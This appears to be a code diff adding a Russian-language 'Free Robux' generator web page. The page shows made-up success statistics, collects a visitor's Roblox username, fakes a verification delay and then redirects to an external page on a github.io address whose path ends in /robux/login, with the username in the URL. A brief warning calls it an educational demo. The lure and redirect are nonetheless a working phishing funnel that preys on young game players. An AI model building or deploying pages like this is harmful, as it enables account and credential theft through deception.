@@ -1,1 +1,195 @@
 
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free Robux - Generator</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+  
+  body {
+    min-height: 100vh;
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    color: #fff;
+  }
+
+  .container {
+    background: rgba(255,255,255,0.05);
+    backdrop-filter: blur(10px);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 20px;
+    padding: 40px;
+    max-width: 480px;
+    width: 100%;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+  }
+
+  .logo {
+    text-align: center;
+    font-size: 42px;
+    margin-bottom: 10px;
+  }
+
+  h1 {
+    text-align: center;
+    font-size: 28px;
+    background: linear-gradient(90deg, #00d4ff, #7b2ff7);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 15px;
+  }
+
+  .description {
+    text-align: center;
+    color: #b0b0c0;
+    font-size: 14px;
+    line-height: 1.6;
+    margin-bottom: 30px;
+  }
+
+  .description strong { color: #00d4ff; }
+
+  .form-group {
+    margin-bottom: 20px;
+  }
+
+  label {
+    display: block;
+    margin-bottom: 8px;
+    font-size: 14px;
+    color: #d0d0e0;
+  }
+
+  input {
+    width: 100%;
+    padding: 14px 16px;
+    background: rgba(0,0,0,0.3);
+    border: 1px solid rgba(255,255,255,0.15);
+    border-radius: 10px;
+    color: #fff;
+    font-size: 15px;
+    outline: none;
+    transition: all 0.3s;
+  }
+
+  input:focus {
+    border-color: #00d4ff;
+    box-shadow: 0 0 15px rgba(0,212,255,0.3);
+  }
+
+  input::placeholder { color: #666; }
+
+  button {
+    width: 100%;
+    padding: 15px;
+    background: linear-gradient(90deg, #00d4ff, #7b2ff7);
+    border: none;
+    border-radius: 10px;
+    color: #fff;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    transition: transform 0.2s, box-shadow 0.2s;
+    letter-spacing: 0.5px;
+  }
+
+  button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 25px rgba(123,47,247,0.4);
+  }
+
+  button:active { transform: translateY(0); }
+  button:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+
+  .warning {
+    margin-top: 20px;
+    padding: 12px;
+    background: rgba(255,170,0,0.1);
+    border: 1px solid rgba(255,170,0,0.3);
+    border-radius: 8px;
+    font-size: 12px;
+    color: #ffaa00;
+    text-align: center;
+    line-height: 1.5;
+  }
+
+  .stats {
+    display: flex;
+    justify-content: space-around;
+    margin: 25px 0;
+    padding: 15px 0;
+    border-top: 1px solid rgba(255,255,255,0.1);
+    border-bottom: 1px solid rgba(255,255,255,0.1);
+  }
+
+  .stat { text-align: center; }
+  .stat .num { font-size: 20px; font-weight: 700; color: #00d4ff; }
+  .stat .lbl { font-size: 11px; color: #888; margin-top: 4px; }
+</style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">💎</div>
+    <h1>Free Robux</h1>
+    
+    <p class="description">
+      Получи до <strong>10 000 Robux</strong> бесплатно! Просто введи свой логин Roblox, 
+      выбери сумму и дождись загрузки. Работает на всех устройствах.
+    </p>
+
+    <div class="stats">
+      <div class="stat"><div class="num">1.2M+</div><div class="lbl">Выдано</div></div>
+      <div class="stat"><div class="num">98%</div><div class="lbl">Успешно</div></div>
+      <div class="stat"><div class="num">24/7</div><div class="lbl">Онлайн</div></div>
+    </div>
+
+    <form id="robuxForm">
+      <div class="form-group">
+        <label for="login">Логин Roblox</label>
+        <input type="text" id="login" placeholder="Введи свой логин..." required autocomplete="off">
+      </div>
+
+      <button type="submit">🎁 Получить Robux</button>
+    </form>
+
+    <div class="warning">
+      ⚠️ Это демо-страница для обучения. Никогда не вводите реальные пароли 
+      на сторонних сайтах — бесплатных Robux не существует!
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById('robuxForm');
+    const loginInput = document.getElementById('login');
+    const button = form.querySelector('button');
+
+    const REDIRECT_URL = 'https://alidevtop.github.io/robux/login';
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const login = loginInput.value.trim();
+      if (!login) return;
+
+      // Блокируем кнопку и показываем загрузку
+      button.disabled = true;
+      button.textContent = '⏳ Проверка логина...';
+
+      setTimeout(() => {
+        button.textContent = '✅ Перенаправление...';
+
+        // Передаём логин в URL-параметре (?login=...)
+        const target = `${REDIRECT_URL}?login=${encodeURIComponent(login)}`;
+
+        setTimeout(() => {
+          window.location.href = target;
+        }, 800);
+      }, 1500);
+    });
+  </script>
+</body>
+</html>
